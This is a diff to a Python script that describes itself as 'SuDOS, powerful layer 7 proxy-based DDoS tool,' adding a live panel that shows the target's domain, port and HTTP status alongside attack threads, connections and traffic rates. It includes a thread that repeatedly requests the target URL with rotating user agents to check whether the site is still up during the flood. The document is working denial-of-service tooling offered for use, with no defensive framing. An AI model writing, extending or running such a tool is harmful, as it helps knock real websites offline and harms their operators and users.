@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-#version: 2.5.2 beta
+#version: 2.5.3 beta
 from rich.live import Live
 import threading
 import argparse
@@ -20,6 +20,9 @@ active_threads = 0
 max_threads = 100
 delay = 1
 running = True
+url = None
+url_dict = None
+target_stats = None
 
 ups = 0
 total_ups = 0
@@ -170,19 +173,36 @@ def rand_chars(length):
 
 def getinfo():
     text = f"""
+ [bold green]TARGET STATUS[/bold green]
+ Domain:        {url_dict['domain']}
+ Port:          {url_dict['port']}
+ Status:        {target_stats}
+
+ [bold green]ATTACK STATUS[/bold green]
  Threads:       {active_threads}
- Connections:   {active_connections}
+ Connected:     {active_connections}
  HR/s:          {hrs}
- D/s:           {dps}
- U/s:           {ups}
+ U/s:           {ups} Byte(s)
+ D/s:           {dps} Byte(s)
     """
     return text
+
+def target_status():
+    try:
+        global target_stats
+        while True:
+            r = requests.get(url, headers={"User-Agent": random.choice(user_agents)})
+            target_stats = f"{r.status_code} {r.reason}"
+            time.sleep(1)
+    except Exception:
+        pass
 
 def verbose():
     try:
         global hrs
         global dps
         global ups
+        threading.Thread(target=target_status, daemon=True).start()
         with Live(getinfo(), auto_refresh=True) as live:
             while True:
                 if not running:
@@ -262,6 +282,8 @@ def main():
         global connection_limit
         global start_time
         global running
+        global url
+        global url_dict
         parser = argparse.ArgumentParser(description="SuDOS, powerful layer 7 proxy-based DDoS tool.")
         parser.add_argument("-t", "--threads", type=int, default=100, metavar="THREAD", help="Max thread count")
         parser.add_argument("-z", "--proxy-type", choices=["http", "socks4", "socks5"], metavar="PROXYTYPE", help="Proxy list type")
@@ -296,6 +318,8 @@ def main():
         if not url_split(url):
             print(f"ERROR: Invalid URL")
             sys.exit()
+
+        url_dict = url_split(url)
 
         if proxy_list:
             if not proxy_type:
